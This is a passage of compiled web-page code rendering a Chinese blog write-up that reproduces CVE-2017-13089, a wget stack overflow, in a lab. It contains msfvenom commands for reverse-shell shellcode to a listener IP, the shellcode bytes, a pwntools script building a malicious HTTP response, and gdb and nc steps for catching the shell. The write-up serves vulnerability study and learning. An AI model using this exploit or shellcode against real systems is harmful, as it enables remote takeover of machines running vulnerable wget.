LHOST"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F78C6C"}},"192.168"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"112"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"2"),s("span",{style:{color:"#A6ACCD"}}," LPORT"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F78C6C"}},"6324"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"f c")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"Payload size"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"74"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"Final size of c file"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"335"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"unsigned char buf"),s("span",{style:{color:"#89DDFF"}},"[]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\xb9\\x02\\x00\\x18\\xb4\\xc0\\xa8\\x70\\x02\\x51\\x48\\x89\\xe6\\x6a\\x10"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD"}},";")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"msf5 "),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," msfvenom "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"p linux"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"x64"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"shell_reverse_tcp LHOST"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F78C6C"}},"192.168"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"112"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"2"),s("span",{style:{color:"#A6ACCD"}}," LPORT"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F78C6C"}},"6789"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"f c")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"Payload size"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"74"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"Final size of c file"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"335"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"unsigned char buf"),s("span",{style:{color:"#89DDFF"}},"[]"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\xb9\\x02\\x00\\x1a\\x85\\xc0\\xa8\\x70\\x02\\x51\\x48\\x89\\xe6\\x6a\\x10"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05"),s("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),s("span",{style:{color:"#A6ACCD"}},";")])])])],-1),As=s("p",null,"如果改变端口的值，只有第二段有略微不同。自己采用6789端口，即第二段sc",-1),xs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"from"),s("span",{style:{color:"#A6ACCD"}}," pwn "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"import"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"""'),s("span",{style:{color:"#C3E88D"}},"HTTP/1.1 401 Not Authorized")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Content-Type: text/plain; charset=UTF-8")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Transfer-Encoding: chunked")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Connection: keep-alive")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"-0xFFFFF000")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},'"""')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sc "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}},"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x1a\\x85\\xc0\\xa8\\x70\\x02\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05"),s("span",{style:{color:"#89DDFF"}},'"')]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," sc "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"568"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#82AAFF"}},"len"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"sc"),s("span",{style:{color:"#89DDFF"}},"))*"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"A"),s("span",{style:{color:"#89DDFF"}},"'")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7fffffffd140"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}},"\\n"),s("span",{style:{color:"#C3E88D"}},"0"),s("span",{style:{color:"#A6ACCD"}},"\\n"),s("span",{style:{color:"#89DDFF"}},'"')]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"with"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"open"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"zzz"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"wb"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"as"),s("span",{style:{color:"#A6ACCD"}}," f"),s("span",{style:{color:"#89DDFF"}},":")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"        f"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"write"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"payload"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),ds=s("p",null,"此处传入的返回地址可能是不准确的，调试一下",-1),fs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#A窗口 监听端口")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nvlp "),s("span",{style:{color:"#F78C6C"}},"6789"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}}," zzz")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#B窗口 调试")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#FFCB6B"}},"set"),s("span",{style:{color:"#A6ACCD"}}," args "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"6789")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b skip_short_body")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"000000000041f18d")])])])],-1),hs=s("p",null,"此时写的地址变成了0xfd190，所以需要把上面的payload的返回地址改成0x190。",-1),_s=s("p",null,"⚠️需要纠正两个点",-1),us=s("p",null,"利用过程主要分为两步，触发漏洞和反弹端口",-1),gs=s("p",null,"(1)触发漏洞：窗口A通过nc开启一个端口6788，B进行调试，连接到这个端口，触发漏洞，执行shellcode。",-1),ms=s("p",null,"(2)反弹shell，shellcode的作用是反弹shell，反弹的端口是在生成木马的时候指定的，此处设置的是6789，C窗口监听6789端口。",-1),bs=s("p",null,"代码如下",-1),Es=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#A")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nvlp "),s("span",{style:{color:"#F78C6C"}},"6788"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}}," zzz")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#B")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"gdb wget")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#FFCB6B"}},"set"),s("span",{style:{color:"#A6ACCD"}}," args "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"6788")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"000000000041f18d")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"r")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#c")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nvlp "),s("span",{style:{color:"#F78C6C"}},"6789")])])])],-1),ks=s("p",null,"执行完shellcode之后，显示如下",-1),vs=s("p",null,[s("img",{src:m,alt:"upload successful"})],-1),ws=s("p",null,"在B窗口 disable 1，取消断点，然后c",-1),Bs=s("p",null,[s("img",{src:b,alt:"upload successful"})],-1),zs=s("p",null,"收获：",-1),Ts=s("p",null,"1、自己基础太差，卡在那里是因为nc的用法、反弹shell 不清楚",-1),$s=s("p",null,"2、适当参考网上的文章，可能有不适用的地方甚至有错误",-1),Is=s("p",null,"3、勤能补拙！多看多花时间，也能理解！",-1),Ss=s("p",null,"参考",-1);function Ps(n,Ns,Zs,Vs,p,Os){const e=A,r=y;return C(),i(r,{frontmatter:p.frontmatter,data:p.data},{"main-content-md":o(()=>[s("h2",k,[l("环境搭建 "),t(e,{class:"header-anchor",href:"#环境搭建","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),v,w,B,s("h2",z,[l("漏洞触发 "),t(e,{class:"header-anchor",href:"#漏洞触发","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),T,$,I,S,P,s("h2",N,[l("静态分析 "),t(e,{class:"header-anchor",href:"#静态分析","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),Z,V,O,U,K,L,H,q,J,s("h2",M,[l("动态分析 "),t(e,{class:"header-anchor",href:"#动态分析","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),R,j,G,Q,W,X,Y,ss,ls,s("h2",os,[l("利用 "),t(e,{class:"header-anchor",href:"#利用","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),ns,as,es,ts,cs,ps,rs,ys,Fs,Ds,is,Cs,As,xs,ds,fs,hs,_s,us,gs,ms,bs,Es,ks,vs,ws,Bs,zs,Ts,$s,Is,Ss,s("ul",null,[s("li",null,[s("p",null,[t(e,{href:"http://www.gandalf.site/2019/01/cve-2017-13089wget.html",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("漏洞分析（一）CVE-2017-13089_wget栈溢出 by gandalf")]),_:1})])]),s("li",null,[s("p",null,[t(e,{href:"https://xz.aliyun.com/t/7394",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("CVE-2017-13089 wget 栈溢出漏洞复现 by h4lo")]),_:1})])]),s("li",null,[s("p",null,[t(e,{href:"https://mp.weixin.qq.com/s/3rBfUnRiFoe-0w2C9JqwZw",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("CVE-2017-13089 wget栈溢出复现 by 雷神众测")]),_:1})])])])]),"main-header":o(()=>[a(n.$slots,"main-header")]),"main-header-after":o(()=>[a(n.$slots,"main-header-after")]),"main-nav":o(()=>[a(n.$slots,"main-nav")]),"main-content":o(()=>[a(n.$slots,"main-content")]),"main-content-after":o(()=>[a(n.$slots,"main-content-after")]),"main-nav-before":o(()=>[a(n.$slots,"main-nav-before")]),"main-nav-after":o(()=>[a(n.$slots,"main-nav-after")]),comment:o(()=>[a(n.$slots,"comment")]),footer:o(()=>[a(n.$slots,"footer")]),aside:o(()=>[a(n.$slots,"aside")]),"aside-custom":o(()=>[a(n.$slots,"aside-custom")]),default:o(()=>[a(n.$slots,"default")]),_:3},8,["frontmatter","data"])}const Ms=F(E,[["render",Ps]]);export{Js as __pageData,Ms as default};
